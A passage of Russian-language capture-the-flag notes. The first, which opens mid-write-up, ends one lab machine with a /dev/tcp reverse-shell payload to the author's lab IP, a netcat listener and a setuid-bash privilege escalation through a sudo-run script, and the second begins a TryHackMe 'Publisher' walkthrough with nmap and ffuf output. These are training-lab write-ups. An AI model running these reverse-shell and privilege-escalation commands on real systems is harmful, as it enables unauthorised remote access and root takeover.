–ù–µ —Å—Ç–æ–∏—Ç –Ω–µ–¥–æ–æ—Ü–µ–Ω–∏–≤–∞—Ç—å —Ö–æ—Ä–æ—à—É—é –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏—é –ø–∞–ø–æ–∫‚Ä¶ —É—Ä–æ–∫ —É—Å–≤–æ–µ–Ω.

–î–∞!!!

![[Pasted image 20240427233720.png]]

–û—Ç–ª–∏—á–Ω–æ, –¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ—á–∏—Å–ª–∏–º –¥–∞–ª—å—à–µ –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ —É –Ω–∞—Å —Ç—É—Ç –µ—Å—Ç—å.

–Ø –±—ã—Å—Ç—Ä–æ –Ω–∞—à–µ–ª —Ñ–ª–∞–≥ user.txt.

–¢–µ–ø–µ—Ä—å –æ —ç—Å–∫–∞–ª–∞—Ü–∏–∏.

## –≠—Å–∫–∞–ª–∞—Ü–∏—è 

–ù–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ —è –≤—Å–µ–≥–¥–∞ –≤—ã–ø–æ–ª–Ω—è—é sudo -l

![[Pasted image 20240427233737.png]]

–•–æ—Ä–æ—à–æ, —ç—Ç–æ –¥–∞–µ—Ç –Ω–∞–º —á—Ç–æ-—Ç–æ —Å–∏–ª—å–Ω–æ–µ.

–Ø –ø—Ä–æ–≤–µ—Ä–∏–ª GTFObins –∏ –Ω–µ –Ω–∞—à–µ–ª –Ω–∏—á–µ–≥–æ –æ—á–µ–≤–∏–¥–Ω–æ–≥–æ:

![[Pasted image 20240427233751.png]]

–î–∞–≤–∞–π—Ç–µ –∏—Å—Å–ª–µ–¥—É–µ–º —Ñ–∞–π–ª:

![[Pasted image 20240427233804.png]]

–ö–∞–∂–µ—Ç—Å—è, —ç—Ç–æ—Ç —Ñ–∞–π–ª –∑–∞—Å–ª—É–∂–∏–≤–∞–µ—Ç –≤–Ω–∏–º–∞–Ω–∏—è:

![[Pasted image 20240427233832.png]]

–ü–æ—Ö–æ–∂–µ, —ç—Ç–æ –º–æ–∂–µ—Ç –±—ã—Ç—å —Ç–∞–∫ –∂–µ –ø—Ä–æ—Å—Ç–æ, –∫–∞–∫ –∏–∑–º–µ–Ω–∏—Ç—å —ç—Ç–æ—Ç —Ñ–∞–π–ª?

–ù—É, –Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ —è –Ω–∏–≥–¥–µ –Ω–µ –Ω–∞—à–µ–ª —Ñ–∞–π–ª–∞ initdb.sh, –¥–∞–∂–µ —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥ –ø–æ–∏—Å–∫–∞.

–í–æ–∑–º–æ–∂–Ω–æ, –µ–≥–æ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç?

–ß—Ç–æ –∂, –¥–∞–≤–∞–π—Ç–µ –ø–æ–ø—Ä–æ–±—É–µ–º —Å–¥–µ–ª–∞—Ç—å –µ–≥–æ –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —á—Ç–æ –ø–æ–ª—É—á–∏—Ç—Å—è. –ú–æ–∂–µ—Ç –±—ã—Ç—å, —ç—Ç–æ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç?

![[Pasted image 20240427233857.png]]

–ú—ã —Å–æ–∑–¥–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –±–∏—Ç, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–ª–∂–µ–Ω –ø–æ–∑–≤–æ–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –ø–æ–ª—É—á–∏—Ç—å root. –¢–µ–ø–µ—Ä—å —Å–¥–µ–ª–∞–µ–º –µ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º:

![[Pasted image 20240427233909.png]]

–•–º

![[Pasted image 20240427233925.png]]

–Ø —Å–æ–±–∏—Ä–∞—é—Å—å –ø–æ–≤—Ç–æ—Ä–∏—Ç—å —Å–≤–æ–∏ —à–∞–≥–∏ –∏ –∏—Å–ø—Ä–∞–≤–∏—Ç—å —Å–≤–æ—é –æ—à–∏–±–∫—É.

–û, –ë–æ–∂–µ. –û—á–µ–Ω—å –ø—Ä–æ—Å—Ç–æ–π –≤–æ–ø—Ä–æ—Å. –¢—ã –≤–∏–¥–µ–ª —ç—Ç–æ?

–Ø –∑–∞–±—ã–ª –∑–∞–ø—É—Å—Ç–∏—Ç—å bash.

![[Pasted image 20240427234001.png]]

![[Pasted image 20240427234012.png]]

–•–æ—Ä–æ—à–∞—è –Ω–µ–∂–Ω–∞—è –∫–æ–º–Ω–∞—Ç–∞, –∏–∑—É—á–∞—é—â–∞—è —Ñ–∞–π–ª—ã cookie/CSRF/XSS –∏ –æ–±—â–µ–µ –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ sudo. –ü—Ä–∏—è—Ç–Ω–æ–µ —Ä–∞–∑–≤–ª–µ—á–µ–Ω–∏–µ –∏ —Ä–∞–∑—É–º–Ω—ã–π –≤—ã–∑–æ–≤ ‚Äî –Ω–∞ —ç—Ç–æ—Ç —Ä–∞–∑ —è —á—É–≤—Å—Ç–≤—É—é, —á—Ç–æ HTB –ø–æ–ª—É—á–∏–ª –¥–æ—Å—Ç–∞—Ç–æ—á–Ω—ã–π —Ä–µ–π—Ç–∏–Ω–≥!

## –í—Ç–æ—Ä–æ–π —Å–ø–æ—Å–æ–±

—è —Å–æ–±–∏—Ä–∞—é—Å—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å¬†[https://www.revshells.com/](https://www.revshells.com/)¬†–∏ netcat –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞—Ç–µ–ª—è

—Å–Ω–∞—á–∞–ª–∞ —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª —ç—Ç—É –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É

```
sh -i >& /dev/tcp/10.10.16.90/9001 0>&1
```

NC —Å–ª—É—à–∞—Ç–µ–ª—å

```
nc -nvlp 9001  
```

—É –º–µ–Ω—è –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–æ, –∏ —Ç–∞–º –Ω–∞–ø–∏—Å–∞–Ω–æ, —á—Ç–æ —è –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –∏–ª–∏ —á—Ç–æ-—Ç–æ –≤ —ç—Ç–æ–º —Ä–æ–¥–µ, –Ω–æ –ø–æ—Å–∫–æ–ª—å–∫—É –º—ã —É–∂–µ –º–æ–∂–µ–º –∑–∞–ø—É—Å–∫–∞—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∫–æ–º–∞–Ω–¥—ã, —Ç–∞–∫–∏–µ –∫–∞–∫ echo, ls –∏ –¥—Ä—É–≥–∏–µ, —è –ø–æ–ø—Ä–æ–±—É—é —Å–æ–∑–¥–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É —á–µ—Ä–µ–∑ –∑–∞–ø—Ä–æ—Å

```
echo '#!/bin/bash' >verse_shell.sh && echo 'sh -i >& /dev/tcp/10.10.16.90/9001 0>&1' >>verse_shell.sh
```

–∏ –Ω–µ –∑–∞–±—É–¥—å—Ç–µ –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞—Ç—å URL, —á—Ç–æ–±—ã –≤—Å–µ —Ä–∞–±–æ—Ç–∞–ª–æ

–ø–æ—Å–ª–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –ø—Ä–æ–º–∞—Ö–æ–≤ –≤—Å–µ –∑–∞—Ä–∞–±–æ—Ç–∞–ª–æ

![[Pasted image 20240428033355.png]]

—Ç–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ –∑–∞–ø—É—Å—Ç–∏–º –µ–≥–æ –∏ –ø–æ—Å–º–æ—Ç—Ä–∏–º, —É–¥–∞—Å—Ç—Å—è –ª–∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ

![[Pasted image 20240428033419.png]]

–∞–±—Å–æ–ª—é—Ç–Ω—ã–π —É—Å–ø–µ—Ö

![[Pasted image 20240428033437.png]]


–∏ –º—ã –ø–æ–ª—É—á–∏–ª–∏ –ø–µ—Ä–≤—ã–π —Ñ–ª–∞–≥

![[Pasted image 20240428033448.png]]

—Ç–µ–ø–µ—Ä—å –¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–π–¥–µ–º –∫ –ø–æ–≤—ã—à–µ–Ω–∏—é –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

![[Pasted image 20240428033508.png]]

–∫–∞–∫ –≤—ã –º–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç—å, –Ω–∞—Å –∑–æ–≤—É—Ç dvir, –¥–∞–≤–∞–π—Ç–µ –ø–æ—Å–º–æ—Ç—Ä–∏–º, –∫–∞–∫–∏–µ –∫–æ–º–∞–Ω–¥—ã –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å dvir —á–µ—Ä–µ–∑ sudo

![[Pasted image 20240428033526.png]]

–≤—ã –º–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç—å, —á—Ç–æ –æ–Ω –º–æ–∂–µ—Ç –∑–∞–ø—É—Å—Ç–∏—Ç—å /usr/bin/syscheck –±–µ–∑ –ø–∞—Ä–æ–ª—è, –∏ —ç—Ç–æ —Ö–æ—Ä–æ—à–µ–µ –Ω–∞—á–∞–ª–æ, –¥–∞–≤–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∏–º —ç—Ç–æ

![[Pasted image 20240428033552.png]]

–∫–∞–∫ –≤—ã –º–æ–∂–µ—Ç–µ –≤–∏–¥–µ—Ç—å, —ç—Ç–æ bash-—Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–ª–∂–µ–Ω –∑–∞–ø—É—Å–∫–∞—Ç—å—Å—è –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è root, –ø—Ä–æ–≤–µ—Ä—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è –∏ –ø–æ–ª—É—á–∞—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–∏—Å—Ç–µ–º–µ, –Ω–æ —Å–∞–º–æ–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –∑–¥–µ—Å—å.

```
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
```

–æ–Ω –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, –∑–∞–ø—É—â–µ–Ω –ª–∏ —Ñ–∞–π–ª initdb.sh, –µ—Å–ª–∏ –Ω–µ—Ç, —Ç–æ –∑–∞–ø—É—Å–∫–∞–µ—Ç –µ–≥–æ, —Ç–∞–∫ —á—Ç–æ, –≤–æ–∑–º–æ–∂–Ω–æ, –º—ã —Å–º–æ–∂–µ–º –∏–∑–º–µ–Ω–∏—Ç—å —ç—Ç–æ—Ç —Ñ–∞–π–ª, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å root-–¥–æ—Å—Ç—É–ø

–ø–æ—Å–ª–µ –ø–æ–∏—Å–∫–∞ —è –Ω–µ –Ω–∞—à–µ–ª —Ñ–∞–π–ª, –ø–æ—ç—Ç–æ–º—É —è —Å–æ–∑–¥–∞–º –Ω–æ–≤—ã–π –∏ –∑–∞—Å—Ç–∞–≤–ª—é –µ–≥–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å –∫–æ—Ä–Ω–µ–≤–æ–π —Ñ–ª–∞–≥

–∫ —Å–æ–∂–∞–ª–µ–Ω–∏—é, —ç—Ç–æ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–æ, –Ω–µ –∑–Ω–∞—é –ø–æ—á–µ–º—É, –Ω–æ –ø–æ—Å–ª–µ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –ø–æ–∏—Å–∫–æ–≤ —è –Ω–∞—à–µ–ª –±–æ–ª–µ–µ –ø—Ä–æ—Å—Ç–æ–π ¬´–ø–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π setuid¬ª, –≤—ã –º–æ–∂–µ—Ç–µ —É–∑–Ω–∞—Ç—å –±–æ–ª—å—à–µ –æ–± —ç—Ç–æ–º –∑–¥–µ—Å—å¬†[https://medium.com/go-cyber/linux-privilege-escalation-with-suid -files-6119d73bc620](https://medium.com/go-cyber/linux-privilege-escalation-with-suid-files-6119d73bc620)

—Å–Ω–∞—á–∞–ª–∞ –º—ã —Å–æ–∑–¥–∞–¥–∏–º —Ñ–∞–π–ª initdb.sh –∏ –æ—Ç–æ–±—Ä–∞–∑–∏–º –≤ –Ω–µ–º chmod u+s /bin/bash.

```
echo "chmod u+s /bin/bash" > initdb.sh
```

–≠—Ç–∞ –∫–æ–º–∞–Ω–¥–∞ –ø–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ—Ç —Ñ–∞–π–ª —Å—Ü–µ–Ω–∞—Ä–∏—è, –∫–æ—Ç–æ—Ä—ã–π —É—Å—Ç–∞–Ω–æ–≤–∏—Ç –±–∏—Ç setuid –¥–ª—è /bin/bash.

–∑–∞—Ç–µ–º —Å–¥–µ–ª–∞–π—Ç–µ —ç—Ç–æ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º —Ñ–∞–π–ª–æ–º

```
chmod +x initdb.sh
```

–∏ —Å–æ–±–∏—Ä–∞—é—Å—å –∑–∞–ø—É—Å—Ç–∏—Ç—å —Å–∏—Å—Ç–µ–º–Ω—É—é –ø—Ä–æ–≤–µ—Ä–∫—É

```
sudo /usr/bin/syscheck
```

—Ç–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ —è –∑–∞–ø—É—Å–∫–∞—é /bin/bash -p, –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —á—Ç–æ —è –ø–æ–ª—É—á—É root-–¥–æ—Å—Ç—É–ø

–±@@–º! –º—ã –ø–æ–ª—É—á–∏–ª–∏ root-–¥–æ—Å—Ç—É–ø

![[Pasted image 20240428033751.png]]

—Ç–µ–ø–µ—Ä—å —Ñ–ª–∞–≥ –∏ –≥–æ—Ç–æ–≤–æ

![[Pasted image 20240428033802.png]]


# Publisher

**–ü–ª–æ—à–∞–¥–∫–∞:** https://tryhackme.com
**–£—Ä–æ–≤–µ–Ω—å:** Easy
**–û–ø–∏—Å–∞–Ω–∏–µ**: –ú–∞—à–∏–Ω–∞ CTF ¬´¬†**Publisher**¬†¬ª ‚Äî —ç—Ç–æ —Å–º–æ–¥–µ–ª–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Ä–µ–¥–∞, –≤ –∫–æ—Ç–æ—Ä–æ–π —Ä–∞–∑–º–µ—â–µ–Ω—ã –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Å–ª—É–∂–±—ã. –° –ø–æ–º–æ—â—å—é —Ä—è–¥–∞ –º–µ—Ç–æ–¥–æ–≤ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è, –≤–∫–ª—é—á–∞—è –Ω–µ—á–µ—Ç–∫–∏–π –∞–Ω–∞–ª–∏–∑ –∫–∞—Ç–∞–ª–æ–≥–æ–≤ –∏ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –≤–µ—Ä—Å–∏–π, –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç—å, –ø–æ–∑–≤–æ–ª—è—é—â–∞—è –≤—ã–ø–æ–ª–Ω—è—Ç—å —É–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ (RCE). –ü–æ–ø—ã—Ç–∫–∏ –ø–æ–≤—ã—Å–∏—Ç—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–∏ —Å –ø–æ–º–æ—â—å—é –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –∑–∞—Ç—Ä—É–¥–Ω–µ–Ω—ã –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º –∫ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∏ –≤–∞–∂–Ω—ã–º —Å–∏—Å—Ç–µ–º–Ω—ã–º —Ñ–∞–π–ª–∞–º –∏ –∫–∞—Ç–∞–ª–æ–≥–∞–º, —á—Ç–æ —Ç—Ä–µ–±—É–µ—Ç –±–æ–ª–µ–µ –≥–ª—É–±–æ–∫–æ–≥–æ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ñ–∏–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å–∏—Å—Ç–µ–º—ã, —á—Ç–æ–±—ã –≤ –∫–æ–Ω–µ—á–Ω–æ–º –∏—Ç–æ–≥–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ª–∞–∑–µ–π–∫—É, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å –Ω–µ–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—É—é –æ–±–æ–ª–æ—á–∫—É bash –∏ –¥–æ–±–∏—Ç—å—Å—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.

## –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ 

```bash
nmap -sC -sV 10.10 .242 .225
```

```
nmap -sC -sV 10.10.242.225  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-29 13:04 EAT  
Nmap scan report for 10.10.242.225  
Host is up (0.28s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)  
| 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)  
|_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)  
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
|_http-title: Publisher's Pulse: SPIP Insights & Tips  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 49.82 seconds
```

–í—ã—à–µ –º—ã –≤–∏–¥–∏–º –¥–≤–∞ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–∞. (–í—Å–µ–≥–¥–∞ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ –ø–æ–ª–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤ –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ, —Ç–∞–∫ –∫–∞–∫ –ª–µ–≥–∫–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã. –Ø –ø—Ä–æ–ø—É—Å—Ç–∏–ª –Ω–µ—Å–∫–æ–ª—å–∫–æ, –∫–æ—Ç–æ—Ä—ã–µ –¥–µ–ª–∞–ª–∏ CTF –∏ boxs, —Ö–æ—Ç—è —ç—Ç–æ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤ —ç—Ç–æ–º box). –ú—ã –Ω–µ –º–æ–∂–µ–º –Ω–∞—á–∞—Ç—å —Å –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è SSH, –ø–æ—Ç–æ–º—É —á—Ç–æ –Ω–∞–º –Ω—É–∂–Ω—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–ª–∏, –ø–æ –∫—Ä–∞–π–Ω–µ–π –º–µ—Ä–µ, –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–∏—è –∞—Ç–∞–∫–∏ –º–µ—Ç–æ–¥–æ–º –ø–æ–¥–±–æ—Ä–∞. –•–æ—Ç—è –≤ –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–µ –∑–∞—â–∏—â–µ–Ω–Ω—ã—Ö —Å–∏—Å—Ç–µ–º –≤ –ø–æ—Å–ª–µ–¥–Ω–µ–µ –≤—Ä–µ–º—è –ø—Ä–∏–º–µ–Ω—è—é—Ç—Å—è –ø–æ–ª–∏—Ç–∏–∫–∏ –ø–∞—Ä–æ–ª–µ–π —Å –º–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ–º –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫ –≤—Ö–æ–¥–∞, –∑–∞ –∫–æ—Ç–æ—Ä—ã–º–∏ —Å–ª–µ–¥—É–µ—Ç –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏.

–°–µ–π—á–∞—Å —è —Å–æ—Å—Ä–µ–¥–æ—Ç–æ—á—É—Å—å –Ω–∞ HTTP. –ü—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –º—ã –ø–æ–ª—É—á–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—É—é –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—É.

![[Pasted image 20240704234124.png]]
## –ü–æ–∏—Å–∫ —Å–∫—Ä—ã—Ç—ã—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤ 

–ü—Ä–∏ –∑–∞–ø—É—Å–∫–µ –ø–µ—Ä–µ–±–æ—Ä–∞ –∫–∞—Ç–∞–ª–æ–≥–æ–≤ —Å –ø–æ–º–æ—â—å—é¬†[ffuf](https://github.com/ffuf/ffuf)¬†–º—ã –ø–æ–ª—É—á–∞–µ–º –∫–∞—Ç–∞–ª–æ–≥ spip. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –±—ã–ª–∞

```bash
ffuf -u http://10.10.163.99/FUZZ -e .php,.txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
```

```
ffuf -u http://10.10.163.99/FUZZ -e .php,.txt -w  /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt                                                                                                              
  
/'___\ /'___\ /'___\  
/\ \__/ /\ \__/ __ __ /\ \__/  
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\  
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/  
\ \_\ \ \_\ \ \____/ \ \_\  
\/_/ \/_/ \/___/ \/_/  
  
v2.1.0-dev  
________________________________________________  
  
:: Method : GET  
:: URL : http://10.10.163.99/FUZZ  
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt  
:: Extensions : .php .txt  
:: Follow redirects : false  
:: Calibration : false  
:: Timeout : 10  
:: Threads : 40  
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500  
________________________________________________

.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 346ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 333ms]
.html.txt               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 332ms]
.html.php               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 335ms]
.htm.php                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 310ms]
.htm.txt                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 310ms]
.htm                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 311ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3015ms]
.                       [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 283ms]
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 293ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 293ms]
.htaccess.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 296ms]
.phtml                  [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 296ms]
.htc                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 282ms]
.htc.php                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 283ms]
.htc.txt                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 280ms]
.html_var_DE.php        [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 289ms]
.html_var_DE.php        [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 289ms]
.html_var_DE.txt        [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 289ms]
.html_var_DE            [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 292ms]
spip                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 280ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 288ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 277ms]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 284ms]
.htpasswd.txt           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 283ms]
```

–ü–µ—Ä–µ–π–¥—è –≤ –∫–∞—Ç–∞–ª–æ–≥ /spip/, –º—ã –ø–æ–ª—É—á–∞–µ–º –µ—â–µ –æ–¥–Ω—É —Å—Ç–∞—Ç—å—é –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º publisher

![[Pasted image 20240705003044.png]]

–ö–∞–∫ —è –æ–ø—Ä–µ–¥–µ–ª–∏–ª, –∫–∞–∫–∞—è —ç—Ç–æ –±—ã–ª–∞ CMS? –Ø –ø—Ä–æ—Å—Ç–æ –≤–∑—è–ª spip.php –∏ –∑–∞–≥—É–≥–ª–∏–ª CMS –≤ Google. –ò–ª–∏ –≤ HTTP-–æ—Ç–≤–µ—Ç–µ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–ª—É–∂–±–µ, –∞ –¥–∞–ª—å—à—É c google-–æ–º –º–æ–∂–Ω–æ –¥–∞–ª—å—à—É –∫–æ–ø–∞—Ç—å)

![[Pasted image 20240705003117.png]]

```
spip.php cms
```

–ü—Ä–æ–¥–æ–ª–∂–∞—è –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—ã, –º—ã –≤–∏–¥–∏–º, —á—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –º–æ–∂–µ—Ç –±—ã—Ç—å —É—è–∑–≤–∏–º–æ –¥–ª—è –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–¥–∞.

![[Pasted image 20240705003211.png]]
## –ê–Ω–∞–ª–∏–∑ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

